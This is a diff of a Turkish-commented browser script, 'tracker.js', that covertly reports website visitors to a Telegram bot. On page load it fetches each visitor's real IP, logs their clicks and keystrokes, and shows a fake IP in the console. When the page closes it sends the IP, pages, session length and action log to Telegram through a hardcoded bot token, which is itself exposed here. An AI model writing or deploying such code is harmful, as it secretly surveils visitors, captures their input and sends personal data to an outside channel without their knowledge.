@@ -1,4 +1,4 @@
-/* tracker.js - v4.1 (GİRİŞ VE ÇIKIŞ RAPORU TELEGRAM) */
+/* tracker.js - v4.3 (TÜM LOG DETAYLARI TELEGRAM'DA) */
 
 // 🛑 TELEGRAM KONFİGÜRASYONLARI
 const BOT_TOKEN = "8581211195:AAHrd09lOZFr3_BKpuNyFcC2UP9Eq1PbGeo";
@@ -10,7 +10,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const userIP = generateFakeIP(); // Konsol logları için sahte IP
     const userGeo = generateFakeGeo(); // Konsol logları için sahte GEO
     let userActivityLog = [];
-    const MAX_LOG_COUNT = 20;
+    const MAX_LOG_COUNT = 50; // Aksiyon loglama limitini artırdık
+    let realIP = 'N/A'; // Gerçek IP'yi Telegram'dan alacağız
 
     function generateFakeIP() {
         return `10.42.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
@@ -26,7 +27,6 @@ document.addEventListener('DOMContentLoaded', () => {
     // -----------------------------------------------------
 
     async function sendTelegramMessage(messageText, skipSpamCheck = false) {
-        // Spam kontrolü sadece sayfa girişinde yapılır, çıkışta her zaman gönderilir.
         if (!skipSpamCheck && sessionStorage.getItem('notified_page_' + window.location.pathname)) return;
 
         try {
@@ -75,6 +75,7 @@ URL: ${window.location.pathname} | REF: ${document.referrer || 'DIRECT_ENTRY'}`;
             const ipResponse = await fetch('https://ipapi.co/json/');
             const data = await ipResponse.json();
             const now = new Date().toLocaleString('tr-TR');
+            realIP = data.ip; // Gerçek IP'yi kaydet
             
             const telegramMessage = `🚨 *YENİ PORTAL ZİYARETİ!*\n\n` +
                             `📂 *Sayfa:* ${window.location.pathname}\n` +
@@ -85,7 +86,6 @@ URL: ${window.location.pathname} | REF: ${document.referrer || 'DIRECT_ENTRY'}`;
                             
             sendTelegramMessage(telegramMessage, false); // skipSpamCheck: false
         } catch (e) {
-             // IP çekilemezse varsayılan mesaj gönderilir
              sendTelegramMessage(`🚨 *YENİ PORTAL ZİYARETİ!* IP çekilemedi. Sayfa: ${window.location.pathname}`, false);
         }
     }
@@ -128,7 +128,7 @@ Action: Error Logged to Remote Server (Simulated)`;
     };
     
     // -----------------------------------------------------
-    // 4. OTURUM SONU VE ÇIKIŞ LOGU
+    // 4. OTURUM SONU VE ÇIKIŞ LOGU (TAM DETAY)
     // -----------------------------------------------------
 
     window.addEventListener('beforeunload', () => {
@@ -139,7 +139,7 @@ Action: Error Logged to Remote Server (Simulated)`;
         const sessionDuration = `${minutes}m ${seconds}s`;
         const totalActions = userActivityLog.length;
         
-        // KONSOL ÇIKIŞ LOGU
+        // KONSOL ÇIKIŞ LOGU VE RAPORU
         const exitLog = `
 [${new Date().toISOString()}] INFO: Session End (EXIT) | 
 IP: ${userIP} | DURATION: ${sessionDuration} | 
@@ -147,24 +147,31 @@ TOTAL ACTIONS: ${totalActions} Clicks/Keys Logged
 -----------------------------------`;
         console.log(exitLog);
 
-        // DAVRANIŞ RAPORUNU TELEGRAM FORMATINA ÇEVİRME
-        let behaviorReport = "--- DAVRANIŞ RAPORU ---";
+        // DAVRANIŞ RAPORUNU OLUŞTUR (Konsolda ve Telegram'da gönderilecek)
+        let behaviorReportConsole = "\n--- NKARTAL BEHAVIOR REPORT ---";
+        let behaviorReportTelegram = "";
+
         if (totalActions > 0) {
             userActivityLog.forEach(log => {
-                behaviorReport += `\n${log}`;
+                behaviorReportConsole += `\n${log}`; // Konsol için her satırı ekle
+                behaviorReportTelegram += `${log.replace(/\[\d+:\d+:\d+\] ACTION:/, '')}\n`; // Telegram'a sadece aksiyonu gönder
             });
+            console.log(behaviorReportConsole);
+            console.log(`-----------------------------------\n`);
         } else {
-             behaviorReport += "\nMinimal aktivite kaydedildi.";
+             behaviorReportTelegram += "Minimal aktivite kaydedildi.";
         }
-
-        // TELEGRAM ÇIKIŞ MESAJI
+        
+        // TELEGRAM ÇIKIŞ MESAJI (Tüm detaylar Telegram'a gönderilir)
         const telegramExitMessage = `✅ *OTURUM SONLANDI: RAPOR*\n` +
                                     `📂 *Sayfa:* ${window.location.pathname}\n` +
                                     `⏳ *Süre:* ${sessionDuration}\n` +
-                                    `🖱 *Aksiyon:* ${totalActions} Tıklama/Tuş\n\n` +
-                                    `\`\`\`\n${behaviorReport}\n\`\`\``;
+                                    `🖱 *Aksiyon:* ${totalActions} Tıklama/Tuş\n` +
+                                    `IP: \`${realIP}\`\n\n` +
+                                    `*KAYDEDİLEN AKSİYONLAR:*\n` +
+                                    `\`\`\`\n${behaviorReportTelegram}\n\`\`\``;
                                     
-        // Çıkış mesajını sendBeacon ile gönderir (En iyi çaba)
+        // Çıkış mesajını sendBeacon ile gönderir
         navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, JSON.stringify({
             chat_id: CHAT_ID,
             text: telegramExitMessage,
